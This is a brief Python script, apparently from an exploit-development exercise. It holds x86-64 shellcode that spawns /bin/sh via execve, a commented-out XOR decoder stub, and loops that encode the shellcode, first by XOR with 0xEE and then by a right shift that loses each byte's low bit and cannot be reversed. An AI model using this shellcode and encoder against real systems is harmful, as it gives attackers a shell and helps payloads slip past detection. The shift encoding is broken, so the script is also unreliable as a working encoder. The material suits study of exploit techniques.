#shellcode = (b"\xeb\x11\x5f\x48\x31\xc9\x80\xc1\x21\x80\x37\xee\x48\xff\xc7\xe2\xf8\xeb\x05\xe8\xea\xff\xff\xff\xa6\xdf\x2e\xbe\xa6\x55\xc1\xc1\x8c\x87\x80\xc1\x9d\x86\xbd\xa6\x67\x09\xbe\xa6\x67\x0c\xbe\xa6\x67\x08\xa6\xdf\x2e\x5e\xd5\xe1\xeb")

shellcode = (b"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x50\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05")

encoded_shellcode_1 = ""

for x in bytearray(shellcode):
    y = x^0xEE
    encoded_shellcode_1+="0x"
    encoded_shellcode_1+="%02x,"%(y & 0xff)

encoded_shellcode_2 = ""

for a in bytearray(shellcode):
    print (a >> 1, a)

    a = a >> 1

    encoded_shellcode_2+="0x"
    encoded_shellcode_2+="%02x,"%(a & 0xff)


print("Shellcode format in array of bytes")
print(encoded_shellcode_1)
print("")
print(encoded_shellcode_2)
print("shellcode length: %d" % len(bytearray(shellcode)))
